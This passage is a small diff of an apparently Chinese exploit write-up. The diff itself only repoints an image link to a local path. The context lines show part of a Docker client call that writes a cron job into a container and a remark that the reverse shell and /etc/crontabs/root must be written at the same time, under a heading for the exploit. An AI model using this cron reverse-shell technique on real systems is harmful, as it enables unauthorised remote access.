@@ -32,7 +32,7 @@ data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bi
 
 此处的反弹shell需要和/etc/crontabs/root文件同时写入，不能后续追加。
 
-![image-20220222182515581](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202221825647.png)
+![image-20220222182515581](./images/202202221825647.png)
 
 ## 漏洞EXP
 
